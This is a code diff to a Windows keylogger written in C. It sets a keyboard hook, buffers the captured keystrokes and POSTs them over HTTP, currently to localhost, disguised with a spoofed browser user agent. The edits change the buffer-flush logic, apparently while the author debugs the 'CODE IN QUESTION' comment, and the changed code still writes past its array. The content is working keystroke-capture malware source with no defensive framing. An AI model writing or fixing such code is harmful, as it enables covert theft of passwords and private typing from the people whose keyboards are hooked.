@@ -7,7 +7,7 @@
 HHOOK hHook = { NULL };
 
 #define N 10
-char capture[N];
+char capture[N] = "\0";
 int captureLength = 0;
 
 enum Keys {
@@ -34,7 +34,7 @@ int post(char capture[]) {
 	char* hdrs = "Content-Type: text/plain";
 	LPCSTR accept[2] = { "text/plain", NULL };
 
-	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
+	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
 	HINTERNET hConnect = InternetConnectA(hSession, "localhost", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
 	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, accept, 0, 0);
 
@@ -67,14 +67,14 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 
 		capture[captureLength] = result;
 		// CODE IN QUESTION
-		if (captureLength + 1 == N) {
+		if (captureLength == N) {
 			post(capture);
 
 			capture[0] = "\0";
 			captureLength = 0;
 		}
 		else {
-			captureLength++;
+			captureLength++;	
 			printf("%d ", captureLength);
 		}
 
